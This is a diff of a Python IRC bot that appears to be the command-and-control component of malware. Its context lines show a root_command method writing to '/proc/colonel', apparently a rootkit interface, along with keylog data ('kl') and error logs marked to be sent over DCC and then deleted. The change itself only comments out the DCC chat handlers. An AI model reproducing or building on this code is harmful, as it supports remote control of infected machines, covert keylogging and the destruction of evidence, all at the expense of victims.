@@ -73,23 +73,23 @@ class Bot(irc.bot.SingleServerIRCBot):
             self.do_command(e, a[1].strip())
         return
 
-    def on_dccmsg(self, c, e):
-        if debug:
-            print "You said: " + e.arguments[0]
+    # def on_dccmsg(self, c, e):
+    #     if debug:
+    #         print "You said: " + e.arguments[0]
 
-        c.privmsg("You said: " + e.arguments[0])
+    #     c.privmsg("You said: " + e.arguments[0])
 
-    def on_dccchat(self, c, e):
-        if len(e.arguments) != 2:
-            return
-        args = e.arguments[1].split()
-        if len(args) == 4:
-            try:
-                address = ip_numstr_to_quad(args[2])
-                port = int(args[3])
-            except ValueError:
-                return
-            self.dcc_connect(address, port)
+    # def on_dccchat(self, c, e):
+    #     if len(e.arguments) != 2:
+    #         return
+    #     args = e.arguments[1].split()
+    #     if len(args) == 4:
+    #         try:
+    #             address = ip_numstr_to_quad(args[2])
+    #             port = int(args[3])
+    #         except ValueError:
+    #             return
+    #         self.dcc_connect(address, port)
 
     def root_command(self, cmd):
         f = open("/proc/colonel", "w")
@@ -115,7 +115,6 @@ class Bot(irc.bot.SingleServerIRCBot):
         # MUST ADD DCC SEND BEFORE DELETING!!!!!
         log.close()
         return kl
-
 
     def error_log(self):
         # SEND ERROR LOG VIA DCC THEN DELETE
@@ -162,16 +161,16 @@ class Bot(irc.bot.SingleServerIRCBot):
                 print "Users: " + ", ".join(users)
                 print "Opers: " + ", ".join(opers)
                 print "Voiced: " + ", ".join(voiced)
-        elif "dcc" == cmd:
-            dcc = self.dcc_listen()
-            c.ctcp("DCC", nick, "CHAT chat %s %d" % (
-                ip_quad_to_numstr(dcc.localaddress),
-                dcc.localport))
+        # elif "dcc" == cmd:
+        #     dcc = self.dcc_listen()
+        #     c.ctcp("DCC", nick, "CHAT chat %s %d" % (
+        #         ip_quad_to_numstr(dcc.localaddress),
+        #         dcc.localport))
 
-            if debug:
-                print "DCC", nick, "CHAT chat %s %d" % (
-                ip_quad_to_numstr(dcc.localaddress),
-                dcc.localport)
+        #     if debug:
+        #         print "DCC", nick, "CHAT chat %s %d" % (
+        #         ip_quad_to_numstr(dcc.localaddress),
+        #         dcc.localport)
         elif "sp" == cmd or "tls" == cmd or "thf" == cmd or "mh"  == cmd or "ms" == cmd or "hp" in cmd:
             self.root_command(cmd)
             status = self.root_status()
